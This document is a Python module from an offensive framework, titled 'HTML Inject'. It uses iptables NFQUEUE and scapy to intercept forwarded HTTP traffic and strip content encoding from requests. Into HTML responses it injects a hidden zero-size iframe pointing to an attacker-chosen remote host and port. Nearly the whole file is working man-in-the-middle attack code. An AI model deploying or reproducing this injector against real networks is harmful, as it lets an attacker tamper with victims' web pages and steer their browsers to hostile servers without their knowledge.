'''
The code_injector software can be included in html_inject.py and script_inject.py
https://github.com/mpostument/hacking_tools/blob/master/LICENSE
	MIT license

	Copyright (c) 2018 Maksym Postument

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
'''

# -*- coding: utf-8 -*-
from termcolor import colored, cprint
from module import Module
from servers.dnserver import *
import threading
from printib import * 
from subprocess import Popen, PIPE
import os
from pathlib import Path
import time
import netfilterqueue
from scapy.all import *
import re
import argparse


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "HTML Inject",
                       "Description": "HTML content manipulation to inject iframe",
                       "Author": "@luisedev @marcos_rm_98"}

        # -----------name-----default_value--description--required?
        options = {"rhost": [None, "Remote host where the request will be sent", True],
                   "rport": ["8080", "Remote port where the request will be sent", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self._option_name = None


    # This module must be always implemented, it is called by the run option
    def run_module(self):

        #def go(options):
        #Enable iptables rules
        os.system("iptables -I FORWARD -j NFQUEUE")

        rhost = self.options["rhost"][0]
        rport =  self.options["rport"][0]
        
        #Code Snippet inspired by: https://github.com/mpostument/hacking_tools/tree/master/code_injector
        #https://github.com/mpostument/hacking_tools/blob/master/LICENSE
        #Receives a packet and the new load to be replaced
        def change(packet, load):
            packet[Raw].load = load # Changes the load to the new one
            del packet[IP].len      #Calculates the IP length
            del packet[IP].chksum   #Calculates the IP checksum
            del packet[TCP].chksum  #Calculates the TCP checksum
            return packet

        #Code Snippet inspired by: https://github.com/mpostument/hacking_tools/tree/master/code_injector 
        #https://github.com/mpostument/hacking_tools/blob/master/LICENSE
        #Callback function that filters the incoming packet and injects a new payload  
        #Called by nfqueue.bind  
        def inject_code(packet):
            http_packet = IP(packet.get_payload())
            
            if http_packet.haslayer(Raw) and http_packet.haslayer(TCP):
                #Destiny port 80
                if http_packet[TCP].dport == 80:
                    load = (http_packet[Raw].load).decode('utf-8','ignore')
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load) # delete encoding
                #Source port 80
                if http_packet[TCP].sport == 80:
                    load = (http_packet[Raw].load).decode('utf-8','ignore')
                    injection_code = "<iframe src=\"http://"+rhost+":"+rport+"/\" height=\"0\" width=\"0\" ></iframe>" #Code to inject
                    load = load.replace("</body>", injection_code + "</body>") #replace selected tag
                    length_search = re.search("(?:Content-Length:\s)(\d*)", load) #get length

                    if length_search and "text/html" in load:
                        length = length_search.group(1) #Old length
                        new_length = int(length) + len(injection_code) #Calculating new length
                        load = load.replace(length, str(new_length)) #Replacing load
                
                    if load != http_packet[Raw].load: #load is not the same
                        new_packet = change(http_packet, load) #change payload
                        packet.set_payload(bytes(new_packet)) #set the new payload

            packet.accept()
       
    
        def myQueue(queue):
            queue.bind(0, inject_code)
            queue.run()
            

        def nfqBinding():
            try:
                queue = netfilterqueue.NetfilterQueue()
                queueThread = threading.Thread(target=myQueue, args=(queue,))
                queueThread.start()
            
                t = threading.currentThread()

                while getattr(t, "do_run", True):
                        time.sleep(1)

                queue.unbind()  #unbind queue
                os.system("iptables -D FORWARD -j NFQUEUE")   #Disable iptables rules

            except Exception as e:
                os.system("iptables -D FORWARD -j NFQUEUE")   #Disable iptables rules
                print_error(e)

        thread1 = threading.Thread(target=nfqBinding)
        thread1.start()
       
        super(CustomModule, self).run(t=thread1)
